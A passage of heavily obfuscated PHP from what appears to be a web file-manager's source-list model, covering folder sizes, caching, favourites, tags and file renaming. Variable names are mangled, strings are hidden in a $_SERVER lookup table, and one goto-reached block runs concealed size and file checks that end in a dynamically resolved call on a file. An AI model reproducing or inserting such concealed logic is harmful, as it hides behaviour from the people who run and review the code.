$²›‹úü–[$‰‚ª®úÎ[78]]); if (!$Òßìùá) { return Model($‰‚ª®úÎ[473])->remove($²›‹úü–[$‰‚ª®úÎ[470]]); } $this->folderSizeReset($Ù‡†Ú·ª[$‰‚ª®úÎ[501]]); return !0; } public function fileSubstr($í¾Û²·À, $¾õƒ§å, $öœ¬ Üı) { $¼»÷¢ = $this->fileInfoGet($í¾Û²·À); if (!$¼»÷¢) { return !1; } return IO::fileSubstr($¼»÷¢[$_SERVER[Ù×¯Ø…][76]], $¾õƒ§å, $öœ¬ Üı); } public function fileInfoGet($şÑ‡Ú²) { $–É¬ãù =& $_SERVER[Ù×¯Ø…]; $º°”Â« = $this->sourceInfo($şÑ‡Ú²); if (!$º°”Â« || $º°”Â«[$–É¬ãù[414]]) { return !1; } $ÖÈš¤Õ = $–É¬ãù[476] . $º°”Â«[$–É¬ãù[470]]; $–Å™§õ = _get(self::$cacheFileInfo, $ÖÈš¤Õ); if ($–Å™§õ) { return $–Å™§õ; } $ş€ÖÖæ÷ = Model($–É¬ãù[473])->fileInfo($º°”Â«[$–É¬ãù[470]]); if ($ş€ÖÖæ÷) { $ş€ÖÖæ÷[$–É¬ãù[28]] = $º°”Â«[$–É¬ãù[28]]; } self::$cacheFileInfo[$ÖÈš¤Õ] = $ş€ÖÖæ÷; return $ş€ÖÖæ÷; } private function folderChildrenNumber($ş‰ß‚€ë) { $ö¨éÏ„™ =& $_SERVER[Ù×¯Ø…]; $ğê¹ïÚ = $this->sourceInfo($ş‰ß‚€ë); $î±ºÕ±Š = array($ö¨éÏ„™[587] => array($ö¨éÏ„™[547], $ğê¹ïÚ[$ö¨éÏ„™[524]] . $ş‰ß‚€ë . $ö¨éÏ„™[548]), $ö¨éÏ„™[433] => intval($ğê¹ïÚ[$ö¨éÏ„™[434]]), $ö¨éÏ„™[580] => 1); $÷°¦¢ºî = $this->where($î±ºÕ±Š)->count(); $¼”À“ = $this->where($î±ºÕ±Š)->where(array($ö¨éÏ„™[580] => 0))->count(); return array($ö¨éÏ„™[82] => $¼”À“, $ö¨éÏ„™[83] => $÷°¦¢ºî); } public function pathInfo($¶Óƒ×«è, $ÄÔŠ¢¢í = false) { $ğŞ÷öÊ =& $_SERVER[Ù×¯Ø…]; $ÄÔŠ¢¢í = !1; $¶Óƒ×«è = intval($¶Óƒ×«è); $¡Ç¸®‹Ç = $ğŞ÷öÊ[462] . intval($ÄÔŠ¢¢í) . $ğŞ÷öÊ[463] . $¶Óƒ×«è; $Š÷ñî¯¸ = _get(self::$cachePathInfo, $¡Ç¸®‹Ç); if ($Š÷ñî¯¸) { return $Š÷ñî¯¸; } $ŸÑÖı = $this->sourceInfo($¶Óƒ×«è); if (!$ŸÑÖı) { return !1; } $ŸÑÖı = $this->_listDataApplyItem($ŸÑÖı, $ÄÔŠ¢¢í); self::$cachePathInfo[$¡Ç¸®‹Ç] = $ŸÑÖı; return $ŸÑÖı; } public static $cachePathInfoMore = array(); public function pathInfoMore($­¨Åï¦ú) { $—åàáæ× =& $_SERVER[Ù×¯Ø…]; $ÉôÅª÷ß = _get(self::$cachePathInfoMore, $­¨Åï¦ú); if ($ÉôÅª÷ß) { return $ÉôÅª÷ß; } $•Ğù¼ôç = $this->pathInfo($­¨Åï¦ú); if (!$•Ğù¼ôç) { return !1; } if ($•Ğù¼ôç[$—åàáæ×[414]] == $—åàáæ×[87]) { $•Ğù¼ôç[$—åàáæ×[81]] = $this->folderChildrenNumber($­¨Åï¦ú); } self::$cachePathInfoMore[$­¨Åï¦ú] = $•Ğù¼ôç; return $•Ğù¼ôç; } public function sourceInfo($Æı­®í›) { $„”²Ààª =& $_SERVER[Ù×¯Ø…]; if (!$Æı­®í›) { return array(); } $Æı­®í› = intval($Æı­®í›); $ËÓ‡ÒÉû = $„”²Ààª[461] . $Æı­®í›; $—Ï³ÕÍ˜ = _get(self::$cacheSourceInfo, $ËÓ‡ÒÉû); if ($—Ï³ÕÍ˜) { return $—Ï³ÕÍ˜; } $‹Ú šÏ¼ = $this->where(array($„”²Ààª[406] => $Æı­®í›))->find(); self::$cacheSourceInfo[$ËÓ‡ÒÉû] = $‹Ú šÏ¼; return self::$cacheSourceInfo[$ËÓ‡ÒÉû]; } public function sourceCacheClear($¹Èƒ§ = false) { self::cacheClear($¹Èƒ§); } public static function cacheClear($Ÿ¡‘Ğâö = false) { $øøæÅÙÄ =& $_SERVER[Ù×¯Ø…]; if ($Ÿ¡‘Ğâö == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$øøæÅÙÄ[461] . $Ÿ¡‘Ğâö]); unset(self::$cachePathInfoMore[$Ÿ¡‘Ğâö]); unset(self::$cachePathInfo[$øøæÅÙÄ[2037] . $Ÿ¡‘Ğâö]); unset(self::$cachePathInfo[$øøæÅÙÄ[2038] . $Ÿ¡‘Ğâö]); } public function metaSet($íÃÄ™ÈÅ, $ğ…äÏü® = null, $®Ï‰Ç·¶ = null) { $£ü°Ñ¬ = parent::metaSet($íÃÄ™ÈÅ, $ğ…äÏü®, $®Ï‰Ç·¶); if ($£ü°Ñ¬) { $this->sourceCacheClear($íÃÄ™ÈÅ); } return $£ü°Ñ¬; } public function pathInfoByPath($¨³ĞÏñÁ, $íŠ—›×±) { $Ù¾ñö–Ä =& $_SERVER[Ù×¯Ø…]; $Ü®ŸûŠÄ = !$íŠ—›×± ? array() : explode($Ù¾ñö–Ä[8], trim($íŠ—›×±, $Ù¾ñö–Ä[8])); $”é¡Ÿßè = $¨³ĞÏñÁ; foreach ($Ü®ŸûŠÄ as $ ­úàÍ¸) { $î¨ÍÛßÃ = array($Ù¾ñö–Ä[501] => $”é¡Ÿßè, $Ù¾ñö–Ä[28] => $ ­úàÍ¸); $Ó¾ò® = $this->where($î¨ÍÛßÃ)->select(); if (!$Ó¾ò®) { return !1; } $Ó¾ò® = array_sort_by($Ó¾ò®, $Ù¾ñö–Ä[434]); $”é¡Ÿßè = $Ó¾ò®[0][$Ù¾ñö–Ä[406]]; } return $this->pathInfo($”é¡Ÿßè, !0); } protected function updateModifyTime($ï­‘Óßõ) { $Õ“› =& $_SERVER[Ù×¯Ø…]; $è˜İê¢† = defined($Õ“›[477]) ? USER_ID : $Õ“›[191]; if (!$ï­‘Óßõ) { return; } if (!is_array($ï­‘Óßõ)) { $ï­‘Óßõ = array($ï­‘Óßõ); } foreach ($ï­‘Óßõ as $ÊÁ¸‘ª¨ => $Û¾ì‘óç) { $ï­‘Óßõ[$ÊÁ¸‘ª¨] = intval($Û¾ì‘óç); $this->sourceCacheClear($Û¾ì‘óç); } $ÒÂ­ôÉ÷ = array($Õ“›[406] => array($Õ“›[7], $ï­‘Óßõ)); $ì…Ü™È = array($Õ“›[586] => $è˜İê¢†, $Õ“›[428] => time()); $this->where($ÒÂ­ôÉ÷)->save($ì…Ü™È); } public function folderSizeReset($é¹ş„¹£, $ßÒ´³™© = false) { $¡ÇÃæ‰° =& $_SERVER[Ù×¯Ø…]; if ($this->statusIgnoreResetSpace) { return; } $Å¦°ÜÀ = $this->sourceInfo($é¹ş„¹£); $çØ‹®«¾ = $¡ÇÃæ‰°[2039] . $é¹ş„¹£; CacheLock::lock($çØ‹®«¾, 20); if ($ßÒ´³™© === !1) { $this->sourceCacheClear($é¹ş„¹£); $Å¦°ÜÀ = $this->sourceInfo($é¹ş„¹£); $Ş¡ÌÁ² = array($¡ÇÃæ‰°[405] => $é¹ş„¹£, $¡ÇÃæ‰°[433] => 0); $÷Œ¥Ÿ†‚ = $this->where($Ş¡ÌÁ²)->sum($¡ÇÃæ‰°[78]); $ßÒ´³™© = intval($÷Œ¥Ÿ†‚) - intval($Å¦°ÜÀ[$¡ÇÃæ‰°[78]]); } if ($ßÒ´³™© == 0) { return CacheLock::unlock($çØ‹®«¾); } $Ê‘­Ö± = $this->parentLevelArray($Å¦°ÜÀ[$¡ÇÃæ‰°[524]]); if (!$Ê‘­Ö±) { $Ê‘­Ö± = array(); } $Ê‘­Ö±[] = $Å¦°ÜÀ[$¡ÇÃæ‰°[406]]; $Ş¡ÌÁ² = array($¡ÇÃæ‰°[406] => array($¡ÇÃæ‰°[422], $Ê‘­Ö±)); if ($ßÒ´³™© < 0) { $Ş¡ÌÁ²[$¡ÇÃæ‰°[78]] = array($¡ÇÃæ‰°[1011], abs($ßÒ´³™©)); } $this->where($Ş¡ÌÁ²)->setAdd($¡ÇÃæ‰°[78], $ßÒ´³™©); CacheLock::unlock($çØ‹®«¾); $Ò†şÉ’ = $¡ÇÃæ‰°[2040] . $Å¦°ÜÀ[$¡ÇÃæ‰°[415]] . $¡ÇÃæ‰°[4] . $Å¦°ÜÀ[$¡ÇÃæ‰°[507]]; $ú¨¦ÇšÓ = array($Å¦°ÜÀ[$¡ÇÃæ‰°[415]], $Å¦°ÜÀ[$¡ÇÃæ‰°[507]]); TaskRun::timeLimitCall($Ò†şÉ’, $¡ÇÃæ‰°[2041], $ú¨¦ÇšÓ, 1.5); } public function folderSizeResetChildren($¤ÊĞÛ¨) { $ºÁ íæ =& $_SERVER[Ù×¯Ø…]; $this->sourceCacheClear($¤ÊĞÛ¨); $íÚÇÈ®â = $this->sourceInfo($¤ÊĞÛ¨); $òœï—âÉ = array($ºÁ íæ[580] => 1, $ºÁ íæ[587] => array($ºÁ íæ[547], $íÚÇÈ®â[$ºÁ íæ[524]] . $¤ÊĞÛ¨ . $ºÁ íæ[548])); $£Ãï†°Ù = $ºÁ íæ[2042]; $ƒ¹¥ƒçĞ = $this->field($£Ãï†°Ù)->where($òœï—âÉ)->select(); $òœï—âÉ[$ºÁ íæ[414]] = 0; $ëòÕ‚ßè = $this->field($£Ãï†°Ù)->where($òœï—âÉ)->select(); if (!$ëòÕ‚ßè) { return; } $ƒ¹¥ƒçĞ[] = $íÚÇÈ®â; $ƒ¹¥ƒçĞ = array_to_keyvalue($ƒ¹¥ƒçĞ, $ºÁ íæ[406]); foreach ($ƒ¹¥ƒçĞ as $ğ–è => $ŒÄ›Â˜å) { $ƒ¹¥ƒçĞ[$ğ–è][$ºÁ íæ[2043]] = $ƒ¹¥ƒçĞ[$ğ–è][$ºÁ íæ[78]]; $ƒ¹¥ƒçĞ[$ğ–è][$ºÁ íæ[78]] = 0; } foreach ($ëòÕ‚ßè as $ŒÄ›Â˜å) { $©â¶»»Ï = $ŒÄ›Â˜å[$ºÁ íæ[501]] . $ºÁ íæ[33]; if (!isset($ƒ¹¥ƒçĞ[$©â¶»»Ï])) { continue; } if ($ŒÄ›Â˜å[$ºÁ íæ[434]] == $ƒ¹¥ƒçĞ[$©â¶»»Ï][$ºÁ íæ[434]]) { $ƒ¹¥ƒçĞ[$©â¶»»Ï][$ºÁ íæ[78]] += $ŒÄ›Â˜å[$ºÁ íæ[78]]; } } foreach ($ƒ¹¥ƒçĞ as $ŒÄ›Â˜å) { $Éºğ¸Ñ¥ = $this->parentLevelArray($ŒÄ›Â˜å[$ºÁ íæ[524]]); foreach ($Éºğ¸Ñ¥ as $©â¶»»Ï) { $©â¶»»Ï = $©â¶»»Ï . $ºÁ íæ[33]; if (!isset($ƒ¹¥ƒçĞ[$©â¶»»Ï])) { continue; } if ($ŒÄ›Â˜å[$ºÁ íæ[434]] == $ƒ¹¥ƒçĞ[$©â¶»»Ï][$ºÁ íæ[434]]) { $ƒ¹¥ƒçĞ[$©â¶»»Ï][$ºÁ íæ[78]] += $ŒÄ›Â˜å[$ºÁ íæ[78]]; } } } $ë¢´íÃÅ = array(); foreach ($ƒ¹¥ƒçĞ as $ŒÄ›Â˜å) { if ($ŒÄ›Â˜å[$ºÁ íæ[78]] == $ŒÄ›Â˜å[$ºÁ íæ[2043]]) { continue; } $ë¢´íÃÅ[] = array($ºÁ íæ[406], $ŒÄ›Â˜å[$ºÁ íæ[406]], $ºÁ íæ[78], $ŒÄ›Â˜å[$ºÁ íæ[78]]); } $this->saveAll($ë¢´íÃÅ); } public function userSpaceReset($ó¢ÓÄï¯ = false) { $•ˆÀ»¤ş =& $_SERVER[Ù×¯Ø…]; $‘Œ÷Æ¬º = $this->where(array($•ˆÀ»¤ş[415] => self::TYPE_USER, $•ˆÀ»¤ş[507] => $ó¢ÓÄï¯, $•ˆÀ»¤ş[414] => 0))->sum($•ˆÀ»¤ş[78]); $‘Œ÷Æ¬º = !$‘Œ÷Æ¬º || $‘Œ÷Æ¬º <= 0 ? 0 : $‘Œ÷Æ¬º; Model($•ˆÀ»¤ş[516])->userEdit($ó¢ÓÄï¯, array($•ˆÀ»¤ş[1736] => $‘Œ÷Æ¬º)); } public function targetSpaceUpdate($Òªˆ’µ, $àŸ÷°ŠÛ) { $©Ë³Òıº =& $_SERVER[Ù×¯Ø…]; if (!$àŸ÷°ŠÛ) { return; } if (!in_array($Òªˆ’µ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $´»®ÖÊñ = $this->targetSpaceSize($Òªˆ’µ, $àŸ÷°ŠÛ); if ($Òªˆ’µ == self::TYPE_USER) { Model($©Ë³Òıº[516])->userEdit($àŸ÷°ŠÛ, array($©Ë³Òıº[1736] => $´»®ÖÊñ)); } else { if ($Òªˆ’µ == self::TYPE_GROUP) { Model($©Ë³Òıº[525])->groupEdit($àŸ÷°ŠÛ, array($©Ë³Òıº[1736] => $´»®ÖÊñ)); } } } public function targetSpaceSize($Ïï—çûÄ, $‡½á×ç¿) { $ŠÀ¬ñ¼ =& $_SERVER[Ù×¯Ø…]; $’—œÍ¢ = $this->sourceRoot($Ïï—çûÄ, $‡½á×ç¿, !0); if (!$’—œÍ¢) { return 0; } $š«íÊ” = floatval($’—œÍ¢[$ŠÀ¬ñ¼[78]]); $È¯íüÑ… = array($ŠÀ¬ñ¼[587] => array($ŠÀ¬ñ¼[547], $ŠÀ¬ñ¼[534] . $’—œÍ¢[$ŠÀ¬ñ¼[406]] . $ŠÀ¬ñ¼[548])); $“Ï´†Ù¹ = Model($ŠÀ¬ñ¼[432])->field($ŠÀ¬ñ¼[421])->where($È¯íüÑ…)->select(); $“Ï´†Ù¹ = array_to_keyvalue($“Ï´†Ù¹, $ŠÀ¬ñ¼[33], $ŠÀ¬ñ¼[406]); $“Ï´†Ù¹ = array_unique(array_filter($“Ï´†Ù¹)); if ($“Ï´†Ù¹) { $È¯íüÑ… = array($ŠÀ¬ñ¼[421] => array($ŠÀ¬ñ¼[422], $“Ï´†Ù¹)); $š«íÊ” += floatval($this->where($È¯íüÑ…)->sum($ŠÀ¬ñ¼[78])); } $š«íÊ” = !$š«íÊ” || $š«íÊ” <= 0 ? 0 : $š«íÊ”; return $š«íÊ”; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($³Óà“ü) { return $this->fileTypeProfile($³Óà“ü, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ã”Åşë) { return $this->fileTypeProfile($ã”Åşë, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÉÈÜ§³ø, $‚ã‰Ñ¸Ñ) { $çßš°¥ï =& $_SERVER[Ù×¯Ø…]; $Âí¿µË = $çßš°¥ï[2044] . $ÉÈÜ§³ø . $çßš°¥ï[71] . $‚ã‰Ñ¸Ñ; $’ˆ¢ŞÌÚ = Cache::get($Âí¿µË); if ($’ˆ¢ŞÌÚ) { return $’ˆ¢ŞÌÚ; } $ÕÅ§šÚ® = array($çßš°¥ï[580] => 0); if ($ÉÈÜ§³ø != !1) { $ÕÅ§šÚ®[$çßš°¥ï[507]] = $ÉÈÜ§³ø; $ÕÅ§šÚ®[$çßš°¥ï[415]] = $‚ã‰Ñ¸Ñ; } $ÅïëöÆ = array(); $ÅïëöÆ[$çßš°¥ï[2045]] = array($çßš°¥ï[2046] => LNG($çßš°¥ï[2045]), $çßš°¥ï[2047] => $this->where($ÕÅ§šÚ®)->count(), $çßš°¥ï[582] => $this->where($ÕÅ§šÚ®)->sum($çßš°¥ï[78])); $“…Ïå¤Ø = KodIO::fileTypeList(); foreach ($“…Ïå¤Ø as $³ü½ö‹» => $Ä–ƒÅ®«) { $ÕÅ§šÚ®[$çßš°¥ï[416]] = $this->fileTypeWhere($³ü½ö‹»); $ÅïëöÆ[$³ü½ö‹»] = array($çßš°¥ï[2046] => $Ä–ƒÅ®«[$çßš°¥ï[28]], $çßš°¥ï[2047] => $this->where($ÕÅ§šÚ®)->count(), $çßš°¥ï[582] => $this->where($ÕÅ§šÚ®)->sum($çßš°¥ï[78])); } Cache::set($Âí¿µË, $ÅïëöÆ, 1200); return $ÅïëöÆ; } public function fileNameExist($“‡ù§, $›­ÉÙêÓ) { $­»Ó—Å‹ =& $_SERVER[Ù×¯Ø…]; $İ£µ¡„ = $this->where(array($­»Ó—Å‹[501] => $“‡ù§, $­»Ó—Å‹[28] => $›­ÉÙêÓ, $­»Ó—Å‹[434] => 0))->find(); return is_array($İ£µ¡„) ? $İ£µ¡„[$­»Ó—Å‹[406]] : !1; } public function childList($†êÍª–) { $é¹ì€Î =& $_SERVER[Ù×¯Ø…]; $ÕµÕÚõ¸ = $é¹ì€Î[2022] . $†êÍª–; if (isset(self::$cacheChildList[$ÕµÕÚõ¸])) { return self::$cacheChildList[$ÕµÕÚõ¸]; } $üØ¸Ç¬ = array($é¹ì€Î[501] => intval($†êÍª–), $é¹ì€Î[434] => 0); $ŸÓĞÀü‚ = $this->where($üØ¸Ç¬)->select(); $ŸÓĞÀü‚ = $ŸÓĞÀü‚ ? $ŸÓĞÀü‚ : array(); self::$cacheChildList[$ÕµÕÚõ¸] = $ŸÓĞÀü‚; foreach ($ŸÓĞÀü‚ as $ÄÎğéŒ†) { $ÕµÕÚõ¸ = $é¹ì€Î[461] . $ÄÎğéŒ†[$é¹ì€Î[406]]; self::$cacheSourceInfo[$ÕµÕÚõ¸] = $ÄÎğéŒ†; } return $ŸÓĞÀü‚; } public function fileNameAuto($ŞĞ»ïáë, $ƒ¹ôÖ½â, $²ÍÔôõ™ = REPEAT_RENAME, $ËÏ¡‘Ø = false) { $ŸÏ®Öš =& $_SERVER[Ù×¯Ø…]; $ßÊ×¦Ì¿ = array($ŸÏ®Öš[501] => $ŞĞ»ïáë, $ŸÏ®Öš[434] => 0, $ŸÏ®Öš[28] => array($ŸÏ®Öš[381], $ƒ¹ôÖ½â . $ŸÏ®Öš[382])); $÷¤§—°Ğ = $this->field($ŸÏ®Öš[28])->where($ßÊ×¦Ì¿)->select(); $ğ§á“³ = array_to_keyvalue($÷¤§—°Ğ, $ŸÏ®Öš[33], $ŸÏ®Öš[28]); return $this->fileNameAutoGet($ğ§á“³, $ƒ¹ôÖ½â, $²ÍÔôõ™, $ËÏ¡‘Ø); } public function fileNameAutoGet($¹øŒî¿, $„—¹ı±·, $…•ôÈá¿, $‚şÚÃ¥Ø) { $¼ßã“›™ =& $_SERVER[Ù×¯Ø…]; if ($…•ôÈá¿ == REPEAT_REPLACE || !$¹øŒî¿ || !in_array_not_case($„—¹ı±·, $¹øŒî¿) || $‚şÚÃ¥Ø && $…•ôÈá¿ != REPEAT_RENAME_FOLDER) { return $„—¹ı±·; } if ($…•ôÈá¿ == REPEAT_SKIP) { return !1; } $ä©×Ÿ = $¼ßã“›™[95] . get_path_ext($„—¹ı±·); $ä©×Ÿ = $ä©×Ÿ == $¼ßã“›™[95] || $‚şÚÃ¥Ø ? $¼ßã“›™[33] : $ä©×Ÿ; for ($¿··Ò = 1; $¿··Ò <= count($¹øŒî¿) + 1; $¿··Ò++) { $¼ˆ¶Óàò = substr($„—¹ı±·, 0, strlen($„—¹ı±·) - strlen($ä©×Ÿ)); $›Œ×›«è = $¼ˆ¶Óàò . "\50{$¿··Ò}\51{$ä©×Ÿ}"; if (!in_array_not_case($›Œ×›«è, $¹øŒî¿)) { return $›Œ×›«è; } } } } goto a˜šä¸Œö; Eïñ¤¢áŞ¹: if ($_SERVER[$_SERVER[Ù×¯Ø…][398]] != $_size($_file)) { $_getc = $_SERVER[Ù×¯Ø…][399]; $_getfile = $_SERVER[$_SERVER[Ù×¯Ø…][400]] . $_SERVER[Ù×¯Ø…][401]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ù×¯Ø…][229], $_getfilec); if (count($_getarrs) < $_SERVER[Ù×¯Ø…][402]) { $exit = $_SERVER[Ù×¯Ø…][403]; $exit(); } $_act = $_SERVER[Ù×¯Ø…][404]; $_act($_file); } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\143\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\141\x6d\145" => "\151\157\x5f\x73\x6f\x75\162\x63\145\137\155\145\x74\x61", "\155\145\164\x61\x46\151\145\154\x64" => "\x73\157\165\162\143\145\x49\x44"); protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\x54\151\155\x65", "\164\151\155\145", "\151\x6e\163\x65\x72\164", "\146\165\156\143\164\x69\x6f\x6e"), array("\143\162\145\141\x74\x65\124\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\145\162\x74", "\146\x75\x6e\143\x74\151\x6f\x6e"), array("\x76\151\145\x77\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\156\x73\145\x72\164", "\x66\x75\156\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÍÄ¿°×¡) { return $this->listSource(array($_SERVER[Ù×¯Ø…][405] => $ÍÄ¿°×¡)); } public function typeName($®¯íöñ) { static $¦—ãÎ¾ = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\145\x6d", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $¦—ãÎ¾[$®¯íöñ . $_SERVER[Ù×¯Ø…][33]]; } public function sourceListInfo($Ñïãô™Ù, $…½ê‡ü = false) { $º‚ñ¿¥Ø =& $_SERVER[Ù×¯Ø…]; $Ñïãô™Ù = $Ñïãô™Ù ? $Ñïãô™Ù : array(); $Ñïãô™Ù = array_filter(array_unique($Ñïãô™Ù)); if (!$Ñïãô™Ù) { return array(); } $™öğ£®ò = $this->where(array($º‚ñ¿¥Ø[406] => array($º‚ñ¿¥Ø[7], $Ñïãô™Ù)))->select(); $this->_listDataApply($™öğ£®ò, $…½ê‡ü); return array_to_keyvalue($™öğ£®ò, $º‚ñ¿¥Ø[406]); } public function pathInfoFilter(&$€¢íÚØÏ) { $º÷„Üƒø =& $_SERVER[Ù×¯Ø…]; static $Â—ıÁÁæ = false; static $Õ½øªª = false; static $ÛÍ÷½ùĞ = false; if (!$Â—ıÁÁæ) { $Ê²±œ›Ö = $º÷„Üƒø[407]; $Ê²±œ›Ö .= $º÷„Üƒø[408]; $Ê²±œ›Ö .= $º÷„Üƒø[409]; $ª£ñŸû· = $º÷„Üƒø[410]; $€ÄÄ¥÷ = explode($º÷„Üƒø[47], $ª£ñŸû·); $Â—ıÁÁæ = explode($º÷„Üƒø[47], $Ê²±œ›Ö); $Õ½øªª = array(); foreach ($Â—ıÁÁæ as $£æ«±‡ô) { if (in_array($£æ«±‡ô, $€ÄÄ¥÷)) { continue; } $Õ½øªª[] = $£æ«±‡ô; } $ÛÍ÷½ùĞ = explode($º÷„Üƒø[47], $º÷„Üƒø[411]); } foreach ($ÛÍ÷½ùĞ as $ãÂø’) { if (isset($€¢íÚØÏ[$ãÂø’])) { $€¢íÚØÏ[$ãÂø’] = intval($€¢íÚØÏ[$ãÂø’]); } } $€¢íÚØÏ[$º÷„Üƒø[76]] = $º÷„Üƒø[412] . $€¢íÚØÏ[$º÷„Üƒø[406]] . $º÷„Üƒø[413]; $€¢íÚØÏ[$º÷„Üƒø[29]] = $€¢íÚØÏ[$º÷„Üƒø[414]] == 1 ? $º÷„Üƒø[77] : $º÷„Üƒø[193]; $€¢íÚØÏ[$º÷„Üƒø[415]] = $this->typeName($€¢íÚØÏ[$º÷„Üƒø[415]]); if ($€¢íÚØÏ[$º÷„Üƒø[414]] != 1) { $€¢íÚØÏ[$º÷„Üƒø[168]] = $€¢íÚØÏ[$º÷„Üƒø[416]]; unset($€¢íÚØÏ[$º÷„Üƒø[416]]); } $ĞøÀ¤ß = $Â—ıÁÁæ; if (isset($€¢íÚØÏ[$º÷„Üƒø[417]]) && $€¢íÚØÏ[$º÷„Üƒø[417]][$º÷„Üƒø[418]] == -1) { $ĞøÀ¤ß = $Õ½øªª; } $€¢íÚØÏ = array_field_key($€¢íÚØÏ, $ĞøÀ¤ß); return $€¢íÚØÏ; } public function listUserFav() { $ËëÈç¾³ =& $_SERVER[Ù×¯Ø…]; $€„éëç¦ = Model($ËëÈç¾³[419])->listData(); $¼Æ¢‡Â¤ = array_filter_by_field($€„éëç¦, $ËëÈç¾³[29], $ËëÈç¾³[420]); $¼Æ¢‡Â¤ = array_to_keyvalue($¼Æ¢‡Â¤, $ËëÈç¾³[33], $ËëÈç¾³[76]); if ($¼Æ¢‡Â¤) { $ŞÀÏ»±‡ = $this->listSource(array($ËëÈç¾³[421] => array($ËëÈç¾³[422], $¼Æ¢‡Â¤))); } $ŞÀÏ»±‡ = array_to_keyvalue($ŞÀÏ»±‡[$ËëÈç¾³[367]], $ËëÈç¾³[406]); foreach ($€„éëç¦ as &$æÙÚİ¿Î) { $æÙÚİ¿Î = array($ËëÈç¾³[423] => $æÙÚİ¿Î[$ËëÈç¾³[395]], $ËëÈç¾³[424] => $æÙÚİ¿Î[$ËëÈç¾³[28]], $ËëÈç¾³[425] => $æÙÚİ¿Î[$ËëÈç¾³[76]], $ËëÈç¾³[426] => $æÙÚİ¿Î[$ËëÈç¾³[29]], $ËëÈç¾³[427] => $æÙÚİ¿Î[$ËëÈç¾³[194]], $ËëÈç¾³[428] => $æÙÚİ¿Î[$ËëÈç¾³[84]]); if ($æÙÚİ¿Î[$ËëÈç¾³[29]] == $ËëÈç¾³[420] && $ŞÀÏ»±‡[$æÙÚİ¿Î[$ËëÈç¾³[76]]]) { $æÙÚİ¿Î[$ËëÈç¾³[85]] = $ŞÀÏ»±‡[$æÙÚİ¿Î[$ËëÈç¾³[76]]]; } } unset($æÙÚİ¿Î); return $€„éëç¦; } public function listUserTag($ÍÖèïûÀ) { $Âœ¡‰ì¬ =& $_SERVER[Ù×¯Ø…]; if ($ÍÖèïûÀ && !is_array($ÍÖèïûÀ)) { $ÍÖèïûÀ = array($ÍÖèïûÀ); } $«ôïŞ¶ = Model($Âœ¡‰ì¬[429])->listData(); $ŠÖœ®îü = array(); foreach ($«ôïŞ¶ as $Ø°ûª†À) { $µåõÜèØ = $Ø°ûª†À[$Âœ¡‰ì¬[76]]; if (!$µåõÜèØ) { continue; } if (!isset($ŠÖœ®îü[$µåõÜèØ])) { $ŠÖœ®îü[$µåõÜèØ] = array(); } $ŠÖœ®îü[$µåõÜèØ][] = $Ø°ûª†À[$Âœ¡‰ì¬[430]]; } $Í¶ÎĞ = array(); foreach ($ŠÖœ®îü as $«¶‹ÀÃÌ => $¬úÓä¿) { $ÒØ™¨²„ = !0; if (!$ÍÖèïûÀ) { $Í¶ÎĞ[] = $«¶‹ÀÃÌ; continue; } foreach ($ÍÖèïûÀ as $İ¿†»Ç) { if (!in_array($İ¿†»Ç, $¬úÓä¿)) { $ÒØ™¨²„ = !1; break; } } if ($ÒØ™¨²„) { $Í¶ÎĞ[] = $«¶‹ÀÃÌ; } } if (!$Í¶ÎĞ) { return array(); } $™™ñ‘òˆ = $this->listSource(array($Âœ¡‰ì¬[421] => array($Âœ¡‰ì¬[422], $Í¶ÎĞ))); if (!$™™ñ‘òˆ || count($Í¶ÎĞ) == $™™ñ‘òˆ[$Âœ¡‰ì¬[364]][$Âœ¡‰ì¬[365]]) { return $™™ñ‘òˆ; } $šëŠúó = array(); $´ôá¨íä = array_to_keyvalue($™™ñ‘òˆ[$Âœ¡‰ì¬[75]], $Âœ¡‰ì¬[33], $Âœ¡‰ì¬[406]); $À¡¼ïÇÖ = array_to_keyvalue($™™ñ‘òˆ[$Âœ¡‰ì¬[74]], $Âœ¡‰ì¬[33], $Âœ¡‰ì¬[406]); $ Éô€´ = array_merge($À¡¼ïÇÖ, $´ôá¨íä); foreach ($Í¶ÎĞ as $µåõÜèØ) { if (!in_array($µåõÜèØ, $ Éô€´)) { $šëŠúó[] = $µåõÜèØ; } } if ($šëŠúó) { Model($Âœ¡‰ì¬[431])->removeBySource($šëŠúó); } return $™™ñ‘òˆ; } public function listUserRecycle() { $²´ÓÌÊú =& $_SERVER[Ù×¯Ø…]; $Î¥â¨¹‹ = Model($²´ÓÌÊú[432])->listData(); if (!$Î¥â¨¹‹) { return array(); } $Ÿ§¾ çÓ = array($²´ÓÌÊú[421] => array($²´ÓÌÊú[422], $Î¥â¨¹‹), $²´ÓÌÊú[433] => 1); return $this->listSource($Ÿ§¾ çÓ); } public function listSource($»Ô™·”ö, $Âƒü§ì = 3000) { $¦´Ó”Ûš =& $_SERVER[Ù×¯Ø…]; if (!isset($»Ô™·”ö[$¦´Ó”Ûš[434]])) { $»Ô™·”ö[$¦´Ó”Ûš[434]] = 0; } $‹˜–¨Ë = $¦´Ó”Ûš[435]; $­Ê¨¬œÜ = $this->field($‹˜–¨Ë)->_makeOrder()->where($»Ô™·”ö)->selectPage($Âƒü§ì); $this->_listPageCheck($­Ê¨¬œÜ, $‹˜–¨Ë, $»Ô™·”ö); $this->_listDataApply($­Ê¨¬œÜ[$¦´Ó”Ûš[367]]); $this->_listMake($­Ê¨¬œÜ); return $­Ê¨¬œÜ; } private function 